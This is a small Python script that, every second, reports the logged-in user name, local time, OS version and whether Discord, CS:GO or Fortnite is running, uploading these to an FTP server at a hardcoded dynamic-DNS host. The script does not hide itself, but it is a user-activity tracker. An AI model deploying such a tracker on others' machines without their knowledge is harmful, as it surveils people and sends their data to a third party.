from ftplib import FTP
import os
import time
import platform
import psutil

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

ver = "v1.1"
author = "ReyMadness"
ip = "reymadness.ddns.net"
port = 63957
ftp = FTP()

def directory_exists(name):
    filelist = []
    ftp.retrlines('LIST',filelist.append)
    for f in filelist:
        if f.split()[-1] == dir and f.upper().startswith('D'):
            return True
    return False

print("Created by", author, ver, "\n")

while(True):
    #FTP-test
    try:
        ftp.connect(ip, port)
        connecton = 1
    except:
        connecton = 0
        print('No connection')

    #getting data from computer
    name = os.getlogin()
    year = str(time.localtime()[0])
    month = str(time.localtime()[1])
    day = str(time.localtime()[2])
    hour = str(time.localtime()[3])
    minute = str(time.localtime()[4])
    second = str(time.localtime()[5])
    op_system = platform.system()
    op_release = platform.release()
    now = year + "-" + month + "-" + day + "\n" + hour + ":" + minute + ":" + second + "\n"
    op = op_system + " " + op_release + "\n"
    if checkIfProcessRunning('discord'):
        discord = "Discord is ON\n"
    else:
        discord = ""
        
    if checkIfProcessRunning('csgo'):
        csgo = "CS:GO is ON\n"
    else:
        csgo = ""
        
    if checkIfProcessRunning('FortniteClient-Win64-Shipping.exe'):
        fortnite = "Fortnite is ON\n"
    else:
        fortnite = ""

    #sending data to server
    if(connecton == 0):
        pass
    else:
        ftp.login("data")
        try:
            ftp.mkd(name)
        except:
            pass
        ftp.cwd(name)
        f = open("data.txt", "w")
        text = name + "\n" + now + op + discord + csgo + fortnite
        f.write(text)
        f.close()
        with open("data.txt") as fobj:
            ftp.storlines("STOR data.txt", open("data.txt", 'rb'))
        os.remove('data.txt')
    time.sleep(1)
